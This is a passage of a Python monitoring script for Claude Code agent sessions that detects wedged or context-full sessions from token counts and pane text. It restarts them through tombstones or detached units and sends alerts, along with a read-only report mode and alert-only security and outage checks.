# byte-for-byte the wedge signature, but the agent is HEALTHY. Claude Code's TUI
# shows a running subagent as a line like
#   [glyph] impl-t1767-bus  Arc-intent: ...  9m 21s . down 385.3k tokens
# The ONLY trustworthy liveness signal is the down-arrow streamed-TOKEN count --
# it grows only when the subagent produces output. The "Nm Ns" timer is
# WALL-CLOCK (renders ~1Hz regardless of progress), so it CANNOT distinguish a
# healthy subagent from a wedged-but-still-rendering one -- deliberately NOT used.
#
# A healthy subagent can be token-quiet for many seconds (a long bash/tool call),
# so a short in-process probe would false-fire. Instead this keys off the natural
# ~5-min POLL cadence: the token count is recorded each staleness-path poll and
# compared across polls. Growth across polls = alive -> suppress; frozen tokens
# across polls = the subagent itself is wedged -> FIRE; no subagent line = a plain
# wedge -> FIRE. (2026-07-15: orchestrator false-wedged 3x on impl-t1767-bus mid-contract-
# arc; a blind force-restart would have killed ~11min + 393k tokens of work.)
#
# Anchored per-line (MULTILINE, glyph at line start) so the glyph and the metrics
# are proven to be one physical line (not a stray prose bullet on the line above).
_SUBAGENT_LINE_RE = re.compile(
    "^\\s*[\u25EF\u25CB\u25CF\u25D0\u25D1\u25D2\u25D3\u2299\u2022]\\s+\\S+.*?\u2193\\s*([\\d.]+)\\s*k",
    re.MULTILINE | re.UNICODE,
)


def _subagent_tokens(pane_text):
    """The down-arrow streamed-token count (in k) from the FIRST running-subagent
    line, or None if there is no such line. Fail-safe: a malformed number -> None."""
    if not pane_text:
        return None
    m = _SUBAGENT_LINE_RE.search(pane_text)
    if not m:
        return None
    try:
        return float(m.group(1))
    except (ValueError, IndexError):
        return None


def _subagent_token_state_path_for_agent(agent):
    """Per-agent last-seen subagent-token state (separate control-loop file)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"subagent_tokens_{agent}.json"


def subagent_block_disposition(agent, cfg, jsonl_name):
    """Decide, across POLLS, whether a wedge-candidate session is subagent-blocked
    (healthy) or genuinely wedged. Returns:
      'fire'     -- no subagent line (plain wedge), OR the subagent's token count
                    is FROZEN vs the last poll (the subagent itself is wedged).
      'suppress' -- the subagent's token count GREW since the last poll (alive).
      'hold'     -- a subagent line is present but there is no prior reading to
                    compare yet (first frozen poll) -- wait one more poll rather
                    than fire, since we cannot yet tell alive-from-wedged.
    State (last tokens + main jsonl) persists between polls; a main-jsonl change
    resets it (fresh session). No subagent line -> 'fire' (conservative)."""
    import json as _json
    tokens = _subagent_tokens(_capture_pane_text(agent, cfg))
    path = _subagent_token_state_path_for_agent(agent)
    if tokens is None:
        try:
            path.unlink()
        except OSError:
            pass
        return "fire"
    prior = None
    try:
        data = _json.loads(path.read_text())
        if data.get("jsonl") == jsonl_name:
            prior = float(data.get("tokens"))
    except (OSError, ValueError, TypeError):
        prior = None
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(_json.dumps({"jsonl": jsonl_name, "tokens": tokens}))
    except OSError:
        pass
    if prior is None:
        return "hold"
    if tokens > prior:
        return "suppress"
    return "fire"


def _notify_wedge_restart(agent: str, tokens: int, mode: str) -> None:
    """Surface a wedge-recovery alert (louder than a clean context-fill restart —
    a wedge is operationally interesting). Routed via Recovery like the other alerts."""
    if mode == "tombstone":
        kind = "restart tombstone written; drain fires within ~30s"
    elif mode == "dispatched":
        kind = "graceful restart dispatched as a detached transient unit (async, T-2459)"
    else:
        kind = "auto-restart fired"
    msg = (
        f"🪤 [wedge] {agent} session WEDGED — fill frozen at {tokens} tokens across "
        f"{STALENESS_POLLS} polls with a non-idle pane; {kind} (T-0857)."
    )
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)
        _send_alert_via_recovery(msg, "wedge-restart")
    except Exception as exc:
        _log(agent, f"wedge notify: recovery-routing unavailable ({exc!r}); direct-telegram fallback")
        send_telegram(f"[fallback: recovery-routing unavailable] {msg}")


def _maybe_fire_staleness(
    agent: str,
    cfg: dict,
    jsonl: Path,
    fill_tokens: int,
    fill_pct: float,
    last_restart_path: Path,
    history: list[dict],
) -> int | None:
    """Wedge/staleness recovery (T-0857). Returns None when not applicable (caller
    falls through to the absolute-threshold check); 0 on clean fire/no-op; 1 on
    fire failure.

    Fires ONLY when: enabled, fill frozen for N polls (history already appended by
    the caller), AND the pane is confirmed wedged. The caller has already passed
    the shared context-fill cooldown gate, so no re-check here (one shared cooldown
    prevents threshold/wedge ping-pong).
    """
    if not STALENESS_ENABLED:
        return None
    if not is_fill_frozen(history):
        return None
    if not _pane_confirmed_wedged(agent):
        _log(
            agent,
            f"fill frozen at {fill_tokens} tok for {STALENESS_POLLS} polls but pane "
            f"is idle/healthy/uncheckable — treating as healthy-idle, NOT firing",
        )
        return None

    # T-1776: the pane reads non-idle, but a session BLOCKED on a live subagent
    # looks identical to a wedge (frozen main jsonl + busy pane). Decide across
    # polls via the subagent's streamed-token count (see subagent_block_disposition):
    #   suppress → subagent streamed more output since last poll (alive);
    #   hold     → subagent present but no prior reading yet (wait one poll);
    #   fire     → no subagent line (plain wedge) OR subagent tokens frozen too.
    disp = subagent_block_disposition(agent, cfg, jsonl.name)
    if disp == "suppress":
        _log(agent, f"fill frozen at {fill_tokens} tok + pane non-idle, BUT the "
                    f"subagent's streamed-token count grew since last poll — "
                    f"subagent-blocked, not wedged; NOT firing (T-1776)")
        return None
    if disp == "hold":
        _log(agent, f"fill frozen at {fill_tokens} tok + pane non-idle + a subagent "
                    f"line present but no prior token reading — holding one poll to "
                    f"judge subagent liveness before firing (T-1776)")
        return None

    _log(
        agent,
        f"WEDGE detected: fill frozen at {fill_tokens} tok across {STALENESS_POLLS} "
        f"polls + pane confirmed non-idle; "
        f"{'writing tombstone' if cfg.get('use_tombstone') else 'firing handoff_and_restart.sh'}",
    )

    # T-1328: record fire-time mtime so the next cycle won't re-fire on this
    # now-frozen transcript (a wedged session's transcript is frozen by definition).
    fire_mtime = _jsonl_mtime(jsonl, cfg["sudo_user"], agent)
    # T-1330: record the dead-transcript guard state UNCONDITIONALLY at fire time
    # (independent of restart-verification success).
    write_last_fire_state(_last_fire_path_for_agent(agent), agent, jsonl, fire_mtime)

    if cfg.get("use_tombstone"):
        state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
        state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
        tombstone_path = write_tombstone(state_dir, agent, reason=STALENESS_REASON)
        _log(agent, f"wedge tombstone ({STALENESS_REASON}) at {tombstone_path}; drain fires within ~30s")
        write_last_restart_state(
            last_restart_path, agent, fill_pct, jsonl, reason=STALENESS_REASON, jsonl_mtime=fire_mtime
        )
        _notify_wedge_restart(agent, fill_tokens, mode="tombstone")
        return 0

    # T-2459: DISPATCH detached (see _maybe_fire_api_health). ok == dispatched,
    # not restarted; the true outcome is reconciled cross-cycle from the unit.
    ok, output, unit = dispatch_detached_restart(cfg, agent, reason=STALENESS_REASON)
    if ok:
        _log(agent, f"wedge restart DISPATCHED as transient unit {unit} (async; "
                    f"forensics: journalctl --user -u {unit}); recording state")
        write_last_restart_state(
            last_restart_path, agent, fill_pct, jsonl, reason=STALENESS_REASON, jsonl_mtime=fire_mtime
        )
        _notify_wedge_restart(agent, fill_tokens, mode="dispatched")
        return 0
    _log(agent, f"wedge restart dispatch FAILED: {output[:500]}")
    failure_count = bump_restart_failure_count(agent, output[:500])
    if failure_count >= RESTART_FAILURE_ALERT_THRESHOLD:
        maybe_alert_restart_failure_threshold(agent, failure_count, output)
    return 1


_REPORT_HISTORY_TAIL = 10  # T-2709: cap the printed history tail defensively —
# read_fill_history applies no cap of its own (only its WRITER,
# append_fill_reading, bounds the ring to STALENESS_POLLS); a hand-edited or
# future larger ring must still print a scannable tail, not the whole file.


def _print_context_report(agent: str, cfg: dict) -> int:
    """Read-only report: latest usage + fill %-of-window for `agent`. T-2709.

    REUSES the existing read primitives (find_latest_jsonl, read_latest_usage,
    read_fill_history) — no new I/O. Zero side effects: no ring-append, no
    state writes, no alerts, no restarts. Prints to stdout (report body) /
    stderr (error message); returns 0 on a successful read, 2 on a
    report-path error (missing jsonl / unusable usage data), matching the
    module's existing argv-error=2 convention (see module docstring).
    """
    context_window = resolve_context_window(cfg)
    threshold = resolve_base_threshold_fraction(context_window, cfg)
    projects_dir = _projects_dir_for_agent(agent, cfg)

    jsonl = find_latest_jsonl(projects_dir, cfg["sudo_user"], agent)
    if jsonl is None:
        print(
            f"[context-fill-monitor --report] agent={agent}: no session jsonl "
            f"found in {projects_dir}",
            file=sys.stderr,
        )
        return 2

    usage = read_latest_usage(jsonl, cfg["sudo_user"], agent)
    if usage is None:
        print(
            f"[context-fill-monitor --report] agent={agent}: jsonl {jsonl} has "
            f"no readable usage event",
            file=sys.stderr,
        )
        return 2

    fill_tokens = compute_fill_tokens(usage)
    fill_pct = fill_tokens / context_window if context_window > 0 else 0.0

    print(f"agent: {agent}")
    print(f"jsonl: {jsonl}")
    print(f"tokens: {fill_tokens} / {context_window}")
    print(f"fill_pct: {fill_pct:.2%}")
    print(f"threshold_pct: {threshold:.2%}")

    history = read_fill_history(_fill_history_path_for_agent(agent))
    if history:
        tail = history[-_REPORT_HISTORY_TAIL:]
        print("history (most recent last):")
        for entry in tail:
            ts = entry.get("ts")
            ts_str = (
                datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()
                if isinstance(ts, (int, float))
                else str(ts)
            )
            print(f"  ts={ts_str} tokens={entry.get('tokens')} jsonl={entry.get('jsonl')}")

    return 0


def main(argv: list[str] | None = None) -> int:
    """Run one poll cycle for the named agent. Returns 0 on clean bail or success; 1 on fire failure; 2 on argv error."""

    try:
        args = _parse_args(argv)
    except SystemExit as exc:
        return int(exc.code) if isinstance(exc.code, int) else 2

    # T-0824 part 3b: --validate is agent-agnostic; check all configs and exit.
    if getattr(args, "validate", False):
        return _validate_config()

    agent = args.agent
    cfg = AGENT_CONFIG[agent]

    # T-2709: --report is a separate READ-ONLY path — branches here, before
    # ANY alert/remediation call below, so it can never fall through into the
    # monitor/remediation loop. See _print_context_report's docstring.
    if getattr(args, "report", False):
        return _print_context_report(agent, cfg)

    # Hook-allowlist security check (T-0536): independent of the jsonl/restart
    # loop — runs every cycle, alert-only, never restarts. Done first so it still
    # fires even when the session jsonl is missing (the bail below) or in cooldown.
    maybe_alert_hook_deviation(agent, cfg)
    # T-1965: staleness guard rides the same cycle — an allowlist entry no
    # command references is a pre-blessed basename, surfaced weekly until pruned.
    maybe_alert_allowlist_staleness(agent, cfg)

    # T-1945: personas with NO @agent timer instance (mnemosyne, the ORG-043
    # seats) would never get their hook-drift SECURITY check run — armed-but-
    # unprobed. Recovery's cycle is their execution home: fan the (read-only,
    # per-agent-throttled) check out to every entry flagged hook_check_via_recovery.
    # Piggybacks on recovery like inbox_consumer's health loop; adds ~1 sudo cat
    # per persona per cycle.
    if agent == "recovery":
        for other, other_cfg in AGENT_CONFIG.items():
            if other != agent and other_cfg.get("hook_check_via_recovery"):
                maybe_alert_hook_deviation(other, other_cfg)
                maybe_alert_allowlist_staleness(other, other_cfg)
                # T-1980 coverage-void fix: observation_only agents (mnemosyne + the
                # ORG-043 seats) have NO @agent monitor timer, so their CAP signals
                # would never be detected — the void that let mnemosyne wedge ~4h until
                # a human caught it. Detection+alert is separable from auto-STEP (which
                # stays off for them): run the alert-only cap detectors here, same
                # piggyback as the hook check. Alert-only — never restarts/auto-switches.
                _sweep_cap_detectors_for(other, other_cfg)

    # Undeclared-repo audit (T-0761 component 5): alert-only tripwire. Runs every
    # cycle, independent of jsonl/cooldown — same shape as maybe_alert_hook_deviation.
    _repo_root = Path(__file__).resolve().parent.parent
    maybe_alert_undeclared_repos(agent, cfg, _repo_root)

    # T-2459: reconcile a prior DETACHED restart dispatch. Runs every cycle,
    # BEFORE the cooldown/dead-transcript bails, so the transient unit's exit
    # status feeds the T-0584 failure-count net promptly (the async replacement
    # for the blocking fire_restart's synchronous success/failure return).
    reconcile_prior_dispatch(agent)

    cooldown = int(
        os.environ.get(
            "CONTEXT_FILL_COOLDOWN_SECONDS", CONTEXT_FILL_COOLDOWN_SECONDS
        )
    )
    context_window = resolve_context_window(cfg)
    # T-1497 part B: window must resolve FIRST — the base trigger is
    # min(absolute onset, cap × window) expressed as a fraction of this window.
    threshold = resolve_base_threshold_fraction(context_window, cfg)

    last_restart_path = _state_path_for_agent(agent)
    last_fire_path = _last_fire_path_for_agent(agent)  # T-1330 dead-transcript guard source
    projects_dir = _projects_dir_for_agent(agent, cfg)

    # Locate the session jsonl up front: both the API-health check and the
    # context-fill check read from it. Done BEFORE the context-fill cooldown
    # gate so api-health can still fire during a context-fill cooldown (the two
    # are independent control loops — per the T-0510 review).
    jsonl = find_latest_jsonl(projects_dir, cfg["sudo_user"], agent)
    if jsonl is None:
        # T-0824 part 2: a None jsonl has two very different causes. Probe whether
        # the directory itself exists to tell them apart instead of logging the
        # same "nothing to do" line forever:
        #   - dir ABSENT  → misconfigured jsonl_dir; the monitor can NEVER detect
        #     fill for this agent (silent total failure) → alert once.
        #   - dir PRESENT → fresh agent with no sessions yet → benign, stay quiet.
        #   - probe INCONCLUSIVE (None) → fail-safe: treat as benign, no alert.
        dir_exists = projects_dir_exists(projects_dir, cfg["sudo_user"], agent)
        if dir_exists is False:
            _log(agent, f"MISCONFIG: jsonl_dir does not exist: {projects_dir} — "
                        f"monitor cannot detect fill for {agent}; bail")
            maybe_alert_missing_projects_dir(agent, projects_dir)
        elif dir_exists is None and not account_exists(cfg["sudo_user"]):
            # T-2071: the probe is inconclusive BECAUSE the sudo_user account does
            # not exist (leftover reference-instance defaults on a fork's box). That
            # is a definite misconfig hiding behind an 'inconclusive' sudo failure —
            # alert loudly instead of the fail-safe-benign fallthrough below.
            acct = cfg["sudo_user"]
            _log(agent, f"MISCONFIG: sudo_user account '{acct}' does not exist — "
                        f"monitor cannot read {agent}'s jsonl and will never fire; bail")
            maybe_alert_missing_projects_dir(
                agent, projects_dir,
                reason=(f"⚠️ [context-fill-monitor] {agent}: sudo_user account "
                        f"'{acct}' does not exist on this box. The monitor cannot "
                        f"read {agent}'s jsonl and will never fire a restart — likely "
                        f"leftover reference-instance defaults. Run "
                        f"`context_fill_monitor.py --validate`."),
            )
        else:
            clear_missing_projects_dir_marker(agent)
            _log(agent, f"no jsonl in {projects_dir} (dir present / fresh agent, "
                        f"no sessions yet); bail")
        return 0

    # --- Dead-transcript re-fire guard (T-1328 + T-1330) ---
    # If find_latest_jsonl picked the frozen transcript we just FIRED a restart against
    # (the freshly-spawned idle session hasn't out-ranked it by mtime yet), acting on it
    # is never right for ANY detector below — bail the whole cycle. Reads last_fire
    # (T-1330: written unconditionally at fire time), so it also guards a transcript
    # frozen by a restart recorded 'failed' (service restarted but steady-state verify
    # timed out — the specialist 2026-06-26 recurrence).
    if selected_jsonl_is_dead_restarted(jsonl, cfg["sudo_user"], agent, last_fire_path):
        _log(agent, f"selected jsonl {jsonl.name} is the just-fired-against (frozen) "
                    f"transcript; fresh session not yet ranked by mtime — bail (T-1328/T-1330)")
        return 0

    # --- API-health check (T-0510): force-restart an alive-but-400ing session.
    # Tombstone-mode agents only (Recovery); own cooldown. ---
    api_health_rc = _maybe_fire_api_health(agent, cfg, jsonl)
    if api_health_rc is not None:
        return api_health_rc

    # --- Model-outage check (T-1126): ALERT (not restart) on a session pinned to
    # a removed/inaccessible --model (sustained 404s). Alert-only, own cooldown,
    # ships dark (PANTHEON_MODEL_OUTAGE_ENABLED). Does not gate the loop. ---
    _maybe_fire_model_outage(agent, cfg, jsonl)

    # --- Auth-outage check (T-1223): ALERT (not restart) on a session that cannot
    # authenticate (sustained 401s). Re-login is the operator's; a restart re-inherits
    # the dead credential. Direct-to-operator, own cooldown, ships ON; no loop gate. ---
    _maybe_fire_auth_outage(agent, cfg, jsonl)

    # Capability-cap wedge, JSONL variant (T-1980): sustained per-turn 429 + cap
    # content = agent stuck on a spend/usage cap that looks idle. Alert-only to
    # Recovery; reliable complement to the pane-scrape below. Ships ON.
    _maybe_fire_capability_cap(agent, cfg, jsonl)

    # Consent-fallback nudge (T-1980 signal-void fix): the Fable weekly-CREDITS cap
    # surfaces as a model_consent_fallback SYSTEM record the harness auto-recovers
    # from (switches the live session to opus) — detect_capability_cap is structurally
    # blind to it. NOT a wedge; an action-nudge to verify the supervisor --model pin so
    # a restart doesn't re-stall. Alert-only to Recovery; own cooldown; ships ON.
    _maybe_fire_consent_fallback(agent, cfg, jsonl)

    # --- Spend-limit-wedge check (2026-06-26): ALERT (not restart) on a session
    # wedged on the monthly-spend-limit modal. Pane-scrape (not JSONL — the modal is
    # not an API error). Raising the limit is the operator's; direct-to-operator, own
    # cooldown, ships ON (PANTHEON_SPEND_LIMIT_ENABLED). Does not gate the loop. ---
    _maybe_fire_spend_limit(agent, cfg)

    # --- Context-fill check (ORG-020): its own cooldown. ---
    if in_cooldown(last_restart_path, cooldown):
        _log(agent, "in cooldown; skipping")
        return 0

    usage = read_latest_usage(jsonl, cfg["sudo_user"], agent)
    if usage is None:
        _log(agent, f"could not read usage from {jsonl}; bail")
        return 0

    fill_tokens = compute_fill_tokens(usage)
    fill_pct = fill_tokens / context_window if context_window > 0 else 0.0
    _log(
        agent,
        f"fill {fill_tokens} / {context_window} = {fill_pct:.2%} "
        f"(threshold {threshold:.0%}, jsonl {jsonl.name})",
    )

    # T-2615: read the explicit hold status once per cycle. Logged here
    # (unconditionally, in the normal per-poll output) so a lingering hold
    # stays VISIBLE to Recovery/the operator even on a cycle where nothing would have
    # fired -- design decision #4b. The actual suppression gate is applied
    # further down, deliberately AFTER the staleness fallthrough (see there
    # for why).
    try:
        from tools import context_fill_hold as _context_fill_hold
    except ImportError:
        import context_fill_hold as _context_fill_hold  # type: ignore
    hold_info = _context_fill_hold.hold_status(agent)
    if hold_info.get("active"):
        _log(
            agent,
            f"context-fill HOLD active (T-2615): reason={hold_info.get('reason') or 'none'} "
            f"set_by={hold_info.get('set_by') or 'unknown'} "
            f"expires_in={int(hold_info.get('remaining_seconds', 0))}s",
        )

    # T-0857: wedge/staleness detection. Append this reading to the ring (every
    # poll, post-cooldown — shares the cooldown with the threshold fire) and, if
    # the session has been frozen for N polls AND its pane is confirmed wedged,
    # fire recovery REGARDLESS of absolute fill (the threshold check below is
    # blind to a frozen-below-threshold wedge — the specialist 2026-06-05 outage).
    fill_history = append_fill_reading(
        _fill_history_path_for_agent(agent), agent, fill_tokens, jsonl
    )
    staleness_rc = _maybe_fire_staleness(
        agent, cfg, jsonl, fill_tokens, fill_pct, last_restart_path, fill_history
    )
    if staleness_rc is not None:
        return staleness_rc

    # T-2615: full-suppress the ABSOLUTE-THRESHOLD restart only, on an active
    # hold. Placed HERE -- after the staleness fallthrough above, deliberately
    # not earlier in this function -- because a check placed before staleness
    # would bail the whole poll cycle and starve _maybe_fire_staleness of ever
    # running while a hold is active. A hold must NEVER be able to suppress wedge/staleness
    # recovery: that is the load-bearing safety boundary this ticket exists to
    # preserve (a stale or mis-set hold masking a real wedge is exactly the
    # failure the ticket forbids). SHAPE is full-suppress (bail), not a raised
    # threshold like the idle-cut below: a manual hold is an ACTIVE,
    # high-velocity session, so the idle-cut's SAFETY INVARIANT
    # ((1 - idle_threshold) x window > velocity_tokens) does not hold for
    # it -- raising the ceiling risks overshooting the hard context window
    # between polls. Full-suppress honestly represents "operator is
    # deliberately riding past the safety net"; context_fill_hold's TTL is
    # what bounds that exposure to a finite window instead of forever.
    if hold_info.get("active"):
        _log(
            agent,
            "context-fill HOLD active (T-2615): suppressing absolute-threshold "
            "restart this cycle (wedge/staleness recovery above is unaffected)",
        )
        return 0

    # Idle-aware threshold (T-1491): a confirmed-idle (low-velocity) session rides
    # to the higher idle ceiling before a protective restart; an active/arc session
    # keeps the tight base margin so a big turn can't overshoot the hard ceiling.
    eff_threshold = effective_fill_threshold(threshold, fill_history, context_window)
    if eff_threshold > threshold and threshold <= fill_pct < eff_threshold:
        _log(
            agent,
            f"idle-aware hold: session low-velocity (idle) at {fill_pct:.2%} — "
            f"below idle ceiling {eff_threshold:.0%} (base {threshold:.0%}); NOT firing",
        )

    if fill_pct < eff_threshold:
        return 0

    _log(
        agent,
        f"threshold crossed ({fill_pct:.2%} >= {eff_threshold:.2%}); "
        f"{'writing tombstone' if cfg.get('use_tombstone') else 'firing handoff_and_restart.sh'}"
        f" against {agent}",
    )

    # T-1328: record the fired-against transcript's mtime so the next cycle can
    # recognise it as the now-frozen dead transcript and not re-fire on it.
    fire_mtime = _jsonl_mtime(jsonl, cfg["sudo_user"], agent)
    # T-1330: record the dead-transcript guard state UNCONDITIONALLY, at fire time —
    # the fire issues the service restart that freezes this transcript whether or not
    # the post-restart verification later passes. (last_restart below is success-only.)
    write_last_fire_state(last_fire_path, agent, jsonl, fire_mtime)

    # Recovery uses tombstone-write instead of direct restart (per ORG-020 Phase 1).
    # The drain timer running on Recovery's own account picks up the tombstone.
    if cfg.get("use_tombstone"):
        state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
        state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
        tombstone_path = write_tombstone(state_dir, agent, reason="context_fill_threshold")
        _log(agent, f"tombstone written at {tombstone_path}; drain timer will fire within ~30s")
        # Record cooldown state so the monitor doesn't keep writing tombstones
        # every 5 min while the drain timer processes the existing one.
        write_last_restart_state(last_restart_path, agent, fill_pct, jsonl, jsonl_mtime=fire_mtime)
        # eff_threshold (not base): an idle-ceiling fire must report the
        # threshold that actually tripped, not "fill 92% ≥ threshold 50%".
        notify_restart_success(agent, fill_pct, eff_threshold, mode="tombstone")  # T-0708
        return 0

    # T-2459: DISPATCH detached (see _maybe_fire_api_health). ok == dispatched,
    # not restarted; the true outcome is reconciled cross-cycle from the unit.
    ok, output, unit = dispatch_detached_restart(cfg, agent, reason="context_fill_threshold")
    if ok:
        _log(agent, f"restart DISPATCHED as transient unit {unit} (async; forensics: "
                    f"journalctl --user -u {unit}); recording state")
        write_last_restart_state(last_restart_path, agent, fill_pct, jsonl, jsonl_mtime=fire_mtime)
        notify_restart_success(agent, fill_pct, eff_threshold, mode="dispatched")  # T-0708
        return 0
    _log(agent, f"restart dispatch FAILED: {output[:500]}")
    # T-0584 Layer 3: track consecutive DISPATCH failures + alert past threshold.
    failure_count = bump_restart_failure_count(agent, output[:500])
    if failure_count >= RESTART_FAILURE_ALERT_THRESHOLD:
        if maybe_alert_restart_failure_threshold(agent, failure_count, output):
            _log(agent, f"restart-failure threshold alert sent (count={failure_count})")
        else:
            _log(agent, f"restart-failure threshold alert FAILED to send (count={failure_count})")
    return 1


if __name__ == "__main__":
    sys.exit(main())
